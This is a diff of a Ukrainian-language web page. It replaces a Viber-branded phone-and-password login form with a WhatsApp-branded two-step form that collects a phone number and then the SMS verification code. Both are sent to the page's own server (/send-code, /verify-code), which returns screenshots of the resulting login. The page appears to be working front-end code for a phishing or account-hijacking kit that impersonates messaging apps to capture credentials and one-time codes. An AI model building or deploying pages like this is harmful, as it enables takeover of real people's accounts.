@@ -1,378 +1,298 @@
 <!DOCTYPE html>
 <html lang="uk">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вхід у Viber</title>
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --purple: #665CAC;
-            --purple-dark: #4e4582;
-            --purple-light: #8B7BBF;
-            --purple-glow: rgba(102, 92, 172, 0.35);
-            --white: #ffffff;
-            --gray: #f4f3fa;
-            --text: #2d2b3d;
-            --muted: #9991c0;
-        }
-
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-
-        body {
-            font-family: 'Nunito', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #1a1730;
-            overflow: hidden;
-        }
-
-        /* Animated background blobs */
-        .bg {
-            position: fixed;
-            inset: 0;
-            z-index: 0;
-            pointer-events: none;
-        }
-        .blob {
-            position: absolute;
-            border-radius: 50%;
-            filter: blur(80px);
-            opacity: 0.4;
-            animation: float 8s ease-in-out infinite;
-        }
-        .blob-1 {
-            width: 500px; height: 500px;
-            background: #665CAC;
-            top: -150px; left: -100px;
-            animation-delay: 0s;
-        }
-        .blob-2 {
-            width: 400px; height: 400px;
-            background: #a078e0;
-            bottom: -100px; right: -80px;
-            animation-delay: 3s;
-        }
-        .blob-3 {
-            width: 300px; height: 300px;
-            background: #4e3fa0;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            animation-delay: 1.5s;
-        }
-        @keyframes float {
-            0%, 100% { transform: translateY(0) scale(1); }
-            50% { transform: translateY(-30px) scale(1.05); }
-        }
-        .blob-3 {
-            animation: float2 8s ease-in-out infinite;
-            animation-delay: 1.5s;
-        }
-        @keyframes float2 {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); }
-            50% { transform: translate(-50%, -55%) scale(1.08); }
-        }
-
-        /* Card */
-        .card {
-            position: relative;
-            z-index: 1;
-            background: rgba(255,255,255,0.07);
-            backdrop-filter: blur(24px);
-            -webkit-backdrop-filter: blur(24px);
-            border: 1px solid rgba(255,255,255,0.13);
-            border-radius: 28px;
-            padding: 48px 44px 44px;
-            width: 100%;
-            max-width: 420px;
-            box-shadow: 0 32px 80px rgba(0,0,0,0.4), 0 0 0 1px rgba(255,255,255,0.05);
-            animation: cardIn 0.7s cubic-bezier(.22,1,.36,1) both;
-        }
-        @keyframes cardIn {
-            from { opacity: 0; transform: translateY(40px) scale(0.97); }
-            to   { opacity: 1; transform: translateY(0) scale(1); }
-        }
-
-        /* Logo */
-        .logo-wrap {
-            display: flex;
-            justify-content: center;
-            margin-bottom: 28px;
-        }
-        .logo-circle {
-            width: 80px; height: 80px;
-            background: linear-gradient(135deg, #7c6fc7, #9f78e0);
-            border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 8px 32px rgba(102,92,172,0.5);
-            animation: pulse 3s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 8px 32px rgba(102,92,172,0.5); }
-            50% { box-shadow: 0 8px 48px rgba(102,92,172,0.8); }
-        }
-        .logo-circle svg { width: 44px; height: 44px; }
-
-        /* Heading */
-        .heading {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-        .heading h1 {
-            font-size: 26px;
-            font-weight: 800;
-            color: #fff;
-            letter-spacing: -0.5px;
-            margin-bottom: 6px;
-        }
-        .heading p {
-            font-size: 14px;
-            color: rgba(255,255,255,0.5);
-            font-weight: 600;
-        }
-
-        /* Inputs */
-        .field {
-            margin-bottom: 16px;
-        }
-        .field label {
-            display: block;
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: rgba(255,255,255,0.5);
-            margin-bottom: 8px;
-        }
-        .input-wrap {
-            position: relative;
-        }
-        .input-wrap .icon {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 18px;
-            pointer-events: none;
-        }
-        .field input {
-            width: 100%;
-            padding: 15px 16px 15px 48px;
-            background: rgba(255,255,255,0.08);
-            border: 1.5px solid rgba(255,255,255,0.12);
-            border-radius: 14px;
-            font-size: 16px;
-            font-family: 'Nunito', sans-serif;
-            font-weight: 600;
-            color: #fff;
-            outline: none;
-            transition: border-color 0.25s, background 0.25s, box-shadow 0.25s;
-        }
-        .field input::placeholder { color: rgba(255,255,255,0.3); }
-        .field input:focus {
-            border-color: #8B7BBF;
-            background: rgba(255,255,255,0.12);
-            box-shadow: 0 0 0 4px rgba(102,92,172,0.2);
-        }
-
-        /* Button */
-        .btn {
-            width: 100%;
-            padding: 16px;
-            margin-top: 8px;
-            background: linear-gradient(135deg, #7c6fc7 0%, #9f78e0 100%);
-            border: none;
-            border-radius: 14px;
-            font-size: 17px;
-            font-family: 'Nunito', sans-serif;
-            font-weight: 800;
-            color: #fff;
-            cursor: pointer;
-            letter-spacing: 0.3px;
-            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
-            box-shadow: 0 8px 24px rgba(102,92,172,0.4);
-            position: relative;
-            overflow: hidden;
-        }
-        .btn::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, rgba(255,255,255,0.15), transparent);
-            opacity: 0;
-            transition: opacity 0.2s;
-        }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 12px 32px rgba(102,92,172,0.55); }
-        .btn:hover::after { opacity: 1; }
-        .btn:active { transform: translateY(0); }
-        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-
-        /* Status */
-        #status {
-            margin-top: 18px;
-            padding: 14px 16px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: 700;
-            text-align: center;
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
-        #status.loading {
-            display: block;
-            background: rgba(255,255,255,0.08);
-            color: rgba(255,255,255,0.7);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        #status.success {
-            display: block;
-            background: rgba(72,199,142,0.15);
-            color: #48c78e;
-            border: 1px solid rgba(72,199,142,0.3);
-        }
-        #status.error {
-            display: block;
-            background: rgba(255,100,100,0.12);
-            color: #ff8080;
-            border: 1px solid rgba(255,100,100,0.25);
-        }
-
-        /* Screenshot */
-        #screenshot {
-            display: none;
-            margin-top: 16px;
-            width: 100%;
-            border-radius: 12px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        /* Spinner */
-        .spinner {
-            display: inline-block;
-            width: 16px; height: 16px;
-            border: 2px solid rgba(255,255,255,0.3);
-            border-top-color: #fff;
-            border-radius: 50%;
-            animation: spin 0.7s linear infinite;
-            vertical-align: middle;
-            margin-right: 8px;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WhatsApp Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fbfdff;overflow:hidden}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none}
+.blob{position:absolute;border-radius:50%;filter:blur(90px);opacity:0.25;animation:float 9s ease-in-out infinite}
+.b1{width:500px;height:500px;background:#2ce062;top:-180px;left:-120px;animation-delay:0s}
+.b2{width:380px;height:380px;background:#31bf0d;bottom:-100px;right:-80px;animation-delay:3.5s}
+.b3{width:280px;height:280px;background:#1bd048;top:55%;left:55%;transform:translate(-50%,-50%);animation-delay:1.8s}
+@keyframes float{0%,100%{transform:translateY(0) scale(1)}50%{transform:translateY(-28px) scale(1.06)}}
+.b3{animation:float2 9s ease-in-out infinite;animation-delay:1.8s}
+@keyframes float2{0%,100%{transform:translate(-50%,-50%) scale(1)}50%{transform:translate(-50%,-55%) scale(1.09)}}
+.card{position:relative;z-index:1;background:rgba(255,255,255,0.06);backdrop-filter:blur(28px);-webkit-backdrop-filter:blur(28px);border:1px solid rgba(255,255,255,0.11);border-radius:20px;padding:44px 40px 40px;width:100%;max-width:400px;box-shadow:0 24px 70px rgba(0,0,0,0.45);animation:cardIn 0.65s cubic-bezier(.22,1,.36,1) both}
+@keyframes cardIn{from{opacity:0;transform:translateY(36px) scale(0.97)}to{opacity:1;transform:translateY(0) scale(1)}}
+.logo-wrap{display:flex;justify-content:center;margin-bottom:24px}
+.logo-circle{width:76px;height:76px;background:linear-gradient(135deg,#2ce068,#31bf0d);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 30px rgba(44,165,224,0.4);animation:pulse 3.5s ease-in-out infinite}
+@keyframes pulse{0%,100%{box-shadow:0 8px 30px rgba(80, 224, 44, 0.4)}50%{box-shadow:0 8px 46px rgba(44, 224, 140, 0.7)}}
+.logo-circle svg{width:42px;height:42px}
+.heading{text-align:center;margin-bottom:28px}
+.heading h1{font-size:22px;font-weight:600;color:#080808;letter-spacing:-0.3px;margin-bottom:5px}
+.heading p{font-size:13px;color:rgba(27, 27, 27, 0.45);font-weight:400}
+.field{margin-bottom:14px}
+.field label{display:block;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1.1px;color:rgba(10, 10, 10, 0.4);margin-bottom:7px}
+.input-wrap{position:relative}
+.input-wrap .icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);display:flex;align-items:center;justify-content:center;pointer-events:none}
+.field input{width:100%;padding:14px 14px 14px 44px;background:rgba(255,255,255,0.07);border:1px solid rgba(34, 32, 32, 0.1);border-radius:12px;font-size:15px;font-family:'Inter',sans-serif;font-weight:400;color:#2b2929;outline:none;transition:border-color .22s,background .22s,box-shadow .22s}
+.field input::placeholder{color:rgba(255,255,255,0.25)}
+.field input:focus{border-color:rgba(44, 224, 53, 0.7);background:rgba(255,255,255,0.1);box-shadow:0 0 0 3px rgba(44,165,224,0.18)}
+.btn{width:100%;padding:14px;margin-top:4px;background:linear-gradient(135deg,#2ce068 0%,#59c71a 100%);border:none;border-radius:12px;font-size:15px;font-family:'Inter',sans-serif;font-weight:600;color:#242222;cursor:pointer;letter-spacing:0.1px;transition:transform .18s,box-shadow .18s,opacity .18s;box-shadow:0 6px 20px rgba(44,165,224,0.35);position:relative;overflow:hidden}
+.btn:hover{transform:translateY(-2px);box-shadow:0 10px 28px rgba(44, 224, 125, 0.5)}
+.btn:active{transform:translateY(0)}
+.btn:disabled{opacity:0.55;cursor:not-allowed;transform:none}
+.back-btn{background:none;border:none;color:rgba(255,255,255,0.45);font-size:13px;font-family:'Inter',sans-serif;cursor:pointer;display:flex;align-items:center;gap:6px;margin-bottom:20px;padding:0;transition:color .18s}
+.back-btn:hover{color:#252323}
+.sms-inputs{display:flex;gap:10px;justify-content:center;margin-bottom:14px}
+.sms-inputs input{width:52px;height:58px;text-align:center;font-size:22px;font-weight:600;padding:0;background:rgba(255,255,255,0.07);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#131212;outline:none;transition:border-color .22s,background .22s,box-shadow .22s;font-family:'Inter',sans-serif}
+.sms-inputs input:focus{border-color:rgba(44, 224, 113, 0.7);background:rgba(255,255,255,0.1);box-shadow:0 0 0 3px rgba(44,165,224,0.18)}
+.resend-row{text-align:center;margin-top:14px}
+.resend-row a{font-size:13px;color:rgba(59, 224, 44, 0.85);text-decoration:none;font-weight:500;cursor:pointer;transition:color .18s}
+.resend-row a:hover{color:#32e02c}
+.resend-row span{font-size:13px;color:rgba(61, 55, 55, 0.918)}
+#status{margin-top:16px;padding:13px 15px;border-radius:11px;font-size:13px;font-weight:500;text-align:center;display:none;animation:fadeIn .28s ease}
+#status2{margin-top:16px;padding:13px 15px;border-radius:11px;font-size:13px;font-weight:500;text-align:center;display:none;animation:fadeIn .28s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
+#status.loading,#status2.loading{display:block;background:rgba(34, 32, 32, 0.979);color:rgba(43, 39, 39, 0.6);border:1px solid rgba(255,255,255,0.09)}
+#status.success,#status2.success{display:block;background:rgba(72,199,142,0.13);color:#48c78e;border:1px solid rgba(72,199,142,0.28)}
+#status.error,#status2.error{display:block;background:rgba(255,90,90,0.1);color:#ff7575;border:1px solid rgba(255,90,90,0.22)}
+.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.25);border-top-color:#1d1b1b;border-radius:50%;animation:spin .65s linear infinite;vertical-align:middle;margin-right:7px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.page{display:none}
+.page.active{display:block;animation:cardIn 0.4s cubic-bezier(.22,1,.36,1) both}
+.phone-display{text-align:center;font-size:15px;color:rgba(20, 19, 19, 0.6);margin-bottom:20px}
+.phone-display strong{color:#222020}
+</style>
 </head>
 <body>
-    <div class="bg">
-        <div class="blob blob-1"></div>
-        <div class="blob blob-2"></div>
-        <div class="blob blob-3"></div>
+<div class="bg">
+  <div class="blob b1"></div>
+  <div class="blob b2"></div>
+  <div class="blob b3"></div>
+</div>
+
+<div class="card">
+  <div class="logo-wrap">
+    <div class="logo-circle">
+      <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg"> <circle cx="24" cy="24" r="23" fill="#25D366"/> <path d="M33.5 28.5c-1.5-1-3-1.5-4.5-2-.5-.2-1 0-1.3.4l-1 1.5c-.3.4-.8.5-1.2.3-2-1-3.5-2.5-4.5-4.5-.2-.4-.1-.9.3-1.2l1.5-1c.4-.3.6-.8.4-1.3-.5-1.5-1-3-2-4.5-.3-.4-.8-.6-1.3-.4-1.5.5-3 1.5-3.5 3-.5 2 0 4.5 2 7.5 2 3 5 6 8 8 3 2 5.5 2.5 7.5 2 1.5-.5 2.5-2 3-3.5.2-.5 0-1-.4-1.3z" fill="white"/> </svg>
     </div>
+  </div>
 
-    <div class="card">
-        <div class="logo-wrap">
-            <div class="logo-circle">
-                <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M33.5 28.5c-1.5-1-3-1.5-4.5-2-.5-.2-1 0-1.3.4l-1 1.5c-.3.4-.8.5-1.2.3-2-1-3.5-2.5-4.5-4.5-.2-.4-.1-.9.3-1.2l1.5-1c.4-.3.6-.8.4-1.3-.5-1.5-1-3-2-4.5-.3-.4-.8-.6-1.3-.4-1.5.5-3 1.5-3.5 3-.5 2 0 4.5 2 7.5 2 3 5 6 8 8 3 2 5.5 2.5 7.5 2 1.5-.5 2.5-2 3-3.5.2-.5 0-1-.4-1.3z" fill="white"/>
-                    <path d="M24 12c5.5 0 10 4 10.5 9 0 .5.5 1 1 1s1-.5 1-1C36 14.5 30.5 10 24 10c-.5 0-1 .5-1 1s.5 1 1 1z" fill="white" opacity="0.8"/>
-                    <path d="M24 16c3.5 0 6.5 2.5 7 6 0 .5.5 1 1 1s1-.5 1-1c-.5-4.5-4.5-8-9-8-.5 0-1 .5-1 1s.5 1 1 1z" fill="white" opacity="0.8"/>
-                    <path d="M24 20c1.5 0 3 1 3.5 2.5.2.5.7.8 1.2.6.5-.2.8-.7.6-1.2C28.5 19.5 26.5 18 24 18c-.5 0-1 .5-1 1s.5 1 1 1z" fill="white" opacity="0.8"/>
-                </svg>
-            </div>
-        </div>
-
-        <div class="heading">
-            <h1>Вхід у Viber</h1>
-            <p>Введіть дані для автоматичного входу</p>
-        </div>
-
-        <form id="viberForm">
-            <div class="field">
-                <label>Номер телефону</label>
-                <div class="input-wrap">
-                    <span class="icon">📱</span>
-                    <input type="tel" id="phone" placeholder="+380XXXXXXXXX" required />
-                </div>
-            </div>
-
-            <div class="field">
-                <label>Пароль</label>
-                <div class="input-wrap">
-                    <span class="icon">🔒</span>
-                    <input type="password" id="password" placeholder="Введіть пароль" required />
-                </div>
-            </div>
-
-            <button type="submit" class="btn" id="submitBtn">
-                Увійти у Viber
-            </button>
-        </form>
-
-        <div id="status"></div>
-        <img id="screenshot" alt="Результат" />
+  <!-- Сторінка 1: Номер телефону -->
+  <div class="page active" id="page-phone">
+    <div class="heading">
+      <h1>WhatsApp</h1>
+      <p>Введіть номер телефону для входу</p>
     </div>
+    <div class="field">
+      <label>Номер телефону</label>
+      <div class="input-wrap">
+        <span class="icon">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12" y2="18.01"/>
+          </svg>
+        </span>
+        <input type="tel" id="phone" placeholder="+380 XX XXX XX XX" required />
+      </div>
+    </div>
+    <button class="btn" id="phoneBtn" onclick="goToSms()">Далі</button>
+    <div id="status"></div>
+  </div>
 
-    <script>
-        document.getElementById('phone').addEventListener('input', function() {
-            this.value = this.value.replace(/[^\d+\s\-()]/g, '');
-        });
+  <!-- Сторінка 2: SMS код -->
+  <div class="page" id="page-sms">
+    <button class="back-btn" onclick="goBack()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg>
+      Назад
+    </button>
+    <div class="heading">
+      <h1>Код підтвердження</h1>
+      <p>Введіть код з SMS або WhatsApp</p>
+    </div>
+    <div class="phone-display">Надіслано на <strong id="phoneDisplay"></strong></div>
+    <div class="sms-inputs">
+      <input type="tel" maxlength="1" class="sms-digit" id="d1" />
+      <input type="tel" maxlength="1" class="sms-digit" id="d2" />
+      <input type="tel" maxlength="1" class="sms-digit" id="d3" />
+      <input type="tel" maxlength="1" class="sms-digit" id="d4" />
+      <input type="tel" maxlength="1" class="sms-digit" id="d5" />
+    </div>
+    <button class="btn" id="smsBtn" onclick="submitSms()">Підтвердити</button>
+    <div class="resend-row">
+      <span id="timerText">Надіслати знову через <strong id="timer">60</strong> сек</span>
+      <a id="resendLink" style="display:none" onclick="resendCode()">Надіслати знову</a>
+    </div>
+    <div id="status2"></div>
+  </div>
+</div>
 
-        document.getElementById('viberForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
+<script>
+let phone = '';
+let timerInterval;
 
-            let phone = document.getElementById('phone').value.replace(/[^\d+]/g, '');
-            if (phone.startsWith('+')) phone = phone.substring(1);
+document.getElementById('phone').addEventListener('input', function() {
+  this.value = this.value.replace(/[^\d+\s\-()]/g, '');
+});
 
-            const password = document.getElementById('password').value;
+document.getElementById('phone').addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') goToSms();
+});
 
-            if (phone.length < 10) {
-                setStatus('error', '❌ Введіть коректний номер телефону');
-                return;
-            }
+async function goToSms() {
+  let raw = document.getElementById('phone').value.replace(/[^\d+]/g, '');
+  if (raw.length < 10) {
+    setStatus('error', 'Введіть коректний номер телефону');
+    return;
+  }
+  phone = raw;
 
-            const btn = document.getElementById('submitBtn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="spinner"></span>Виконується вхід...';
-            setStatus('loading', '⏳ Підключаємось до Viber...');
+  const btn = document.getElementById('phoneBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>Підключення...';
+  setStatus('loading', 'Відправляємо номер...');
 
-            try {
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, password })
-                });
+  try {
+    const res = await fetch('/send-code', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ phone })
+    });
+    const data = await res.json();
 
-                const data = await response.json();
+    if (data.success) {
+      document.getElementById('phoneDisplay').textContent = '+' + (phone.startsWith('+') ? phone.slice(1) : phone);
+      document.getElementById('page-phone').classList.remove('active');
+      document.getElementById('page-sms').classList.add('active');
+      clearStatus();
+      startTimer();
+      setTimeout(() => document.getElementById('d1').focus(), 100);
+    } else {
+      setStatus('error', data.error || 'Помилка відправки');
+    }
+  } catch {
+    setStatus('error', 'Сервер недоступний');
+  }
 
-                if (data.success) {
-                    setStatus('success', '✅ Успішно! Дивіться результат нижче');
-                    const img = document.getElementById('screenshot');
-                    img.src = 'data:image/png;base64,' + data.screenshot;
-                    img.style.display = 'block';
+  btn.disabled = false;
+  btn.innerHTML = 'Далі';
+}
 
-                    // Показуємо скріншот ДО кліку
-                    if (data.screenshotBefore) {
-                        const img2 = document.createElement('img');
-                        img2.src = 'data:image/png;base64,' + data.screenshotBefore;
-                        img2.style.cssText = 'width:100%;border-radius:12px;margin-top:8px;border:1px solid rgba(255,255,255,0.1)';
-                        document.querySelector('.card').appendChild(img2);
-                    }
-                }
-            } catch (err) {
-                setStatus('error', '❌ Сервер недоступний');
-            }
+function goBack() {
+  document.getElementById('page-sms').classList.remove('active');
+  document.getElementById('page-phone').classList.add('active');
+  clearInterval(timerInterval);
+  clearDigits();
+}
 
-            btn.disabled = false;
-            btn.innerHTML = 'Увійти у Viber';
-        });
+function startTimer() {
+  let sec = 60;
+  document.getElementById('timer').textContent = sec;
+  document.getElementById('timerText').style.display = '';
+  document.getElementById('resendLink').style.display = 'none';
+  clearInterval(timerInterval);
+  timerInterval = setInterval(() => {
+    sec--;
+    document.getElementById('timer').textContent = sec;
+    if (sec <= 0) {
+      clearInterval(timerInterval);
+      document.getElementById('timerText').style.display = 'none';
+      document.getElementById('resendLink').style.display = '';
+    }
+  }, 1000);
+}
 
-        function setStatus(type, text) {
-            const el = document.getElementById('status');
-            el.className = type;
-            el.innerHTML = text;
-            el.style.display = 'block';
-        }
-    </script>
+async function resendCode() {
+  const btn = document.getElementById('smsBtn');
+  btn.disabled = true;
+  setStatus2('loading', 'Відправляємо повторно...');
+  try {
+    const res = await fetch('/send-code', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ phone })
+    });
+    const data = await res.json();
+    if (data.success) {
+      setStatus2('success', 'Код надіслано повторно');
+      startTimer();
+      setTimeout(() => clearStatus2(), 2000);
+    } else {
+      setStatus2('error', data.error || 'Помилка');
+    }
+  } catch {
+    setStatus2('error', 'Сервер недоступний');
+  }
+  btn.disabled = false;
+}
+
+function clearDigits() {
+  document.querySelectorAll('.sms-digit').forEach(i => i.value = '');
+}
+
+document.querySelectorAll('.sms-digit').forEach((input, idx, arr) => {
+  input.addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '').slice(-1);
+    if (this.value && idx < arr.length - 1) arr[idx + 1].focus();
+    if (idx === arr.length - 1 && this.value) submitSms();
+  });
+  input.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !this.value && idx > 0) arr[idx - 1].focus();
+  });
+  input.addEventListener('paste', function(e) {
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+    arr.forEach((inp, i) => { inp.value = text[i] || ''; });
+    const last = Math.min(text.length, arr.length) - 1;
+    if (last >= 0) arr[last].focus();
+    if (text.length >= arr.length) submitSms();
+  });
+});
+
+async function submitSms() {
+  const code = Array.from(document.querySelectorAll('.sms-digit')).map(i => i.value).join('');
+  if (code.length < 5) { setStatus2('error', 'Введіть повний код'); return; }
+  const btn = document.getElementById('smsBtn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>Перевірка...';
+  setStatus2('loading', 'Перевіряємо код...');
+  try {
+    const res = await fetch('/verify-code', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ phone, code })
+    });
+    const data = await res.json();
+    if (data.success) {
+      setStatus2('success', 'Успішно! Дивіться результат нижче');
+      if (data.screenshot) {
+        const img = document.createElement('img');
+        img.src = 'data:image/png;base64,' + data.screenshot;
+        img.style.cssText = 'width:100%;border-radius:11px;margin-top:12px;border:1px solid rgba(255,255,255,0.08)';
+        document.querySelector('.card').appendChild(img);
+      }
+    } else {
+      setStatus2('error', data.error || 'Невірний код');
+      clearDigits();
+      document.getElementById('d1').focus();
+    }
+  } catch {
+    setStatus2('error', 'Сервер недоступний');
+  }
+  btn.disabled = false;
+  btn.innerHTML = 'Підтвердити';
+}
+
+function setStatus(type, text) {
+  const el = document.getElementById('status');
+  el.className = type; el.textContent = text; el.style.display = 'block';
+}
+function clearStatus() {
+  const el = document.getElementById('status');
+  el.style.display = 'none';
+}
+function setStatus2(type, text) {
+  const el = document.getElementById('status2');
+  el.className = type; el.textContent = text; el.style.display = 'block';
+}
+function clearStatus2() {
+  const el = document.getElementById('status2');
+  el.style.display = 'none';
+}
+</script>
 </body>
 </html>
